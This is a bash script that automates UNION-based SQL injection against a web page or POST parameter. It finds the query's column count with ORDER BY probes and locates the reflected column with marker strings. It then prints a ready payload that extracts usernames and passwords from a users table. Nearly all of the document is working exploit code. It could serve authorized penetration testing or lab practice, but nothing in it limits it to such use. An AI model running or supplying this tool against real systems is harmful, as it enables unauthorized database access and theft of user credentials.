#!/usr/bin/env bash
# sqli-union — find the column count and the reflected column for a UNION SQLi.
#
# Two stages over curl:
#   1) ORDER BY N until the response changes/errors  -> column count
#   2) UNION SELECT with a unique marker in each slot -> which column prints
#
# Point it at a URL with the injectable value replaced by the token INJECT.
# Works for GET (default) or POST data (-d).
#
# Usage:
#   ./sqli-union.sh "http://app/page.php?id=INJECT"
#   ./sqli-union.sh "http://app/x" -d "id=INJECT" -c "session=abc"
#
# Flags:  -d <postdata>   -c <cookie>   -m <max cols, default 12>   -C "<comment>, default '-- -'"
set -euo pipefail

URL="${1:?usage: sqli-union.sh \"http://app/page?id=INJECT\" [-d postdata] [-c cookie] [-m max] [-C comment]}"
shift || true
POST="" ; COOKIE="" ; MAX=12 ; CMT="-- -"
while [ $# -gt 0 ]; do case "$1" in
  -d) POST="$2"; shift 2;; -c) COOKIE="$2"; shift 2;;
  -m) MAX="$2"; shift 2;; -C) CMT="$2"; shift 2;; *) shift;; esac; done

req() { # $1 = injected value
  local inj="$1" data
  if [ -n "$POST" ]; then
    data="${POST/INJECT/$inj}"
    curl -s ${COOKIE:+-H "Cookie: $COOKIE"} --data "$data" "$URL"
  else
    curl -s ${COOKIE:+-H "Cookie: $COOKIE"} "${URL/INJECT/$inj}"
  fi
}

urlenc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1"; }

echo "[*] Baseline length:"
BASE=$(req "1" | wc -c); echo "    $BASE bytes"

echo "[*] Stage 1 — ORDER BY (watching for a length change / error):"
COLS=0
for n in $(seq 1 "$MAX"); do
  p=$(urlenc "1' ORDER BY $n $CMT")
  len=$(req "$p" | wc -c)
  echo "    ORDER BY $n -> $len bytes"
  if [ "$len" != "$BASE" ]; then echo "    ^ change at $n (column count is likely $((n-1)))"; COLS=$((n-1)); break; fi
done
[ "$COLS" -eq 0 ] && { echo "[!] No change up to $MAX cols — try -C '#', a numeric break (no quote), or raise -m."; exit 0; }

echo "[*] Stage 2 — reflected column (marker WARMxx per slot, N=$COLS):"
build() { local i s=""; for i in $(seq 1 "$COLS"); do [ "$i" -gt 1 ] && s+=","; s+="'WARM$i'"; done; echo "$s"; }
p=$(urlenc "-1' UNION SELECT $(build) $CMT")
out=$(req "$p")
hit=$(echo "$out" | grep -oE 'WARM[0-9]+' | head -1 || true)
if [ -n "$hit" ]; then
  echo "    printed column: ${hit#WARM}  (marker $hit found in the response)"
  echo "    -> swap that slot for your data, e.g.:"
  echo "       -1' UNION SELECT $(build | sed "s/'WARM${hit#WARM}'/group_concat(username,0x3a,password)/") FROM users $CMT"
else
  echo "    No marker reflected. The query may be numeric (drop the quote) or output isn't echoed (go blind)."
fi
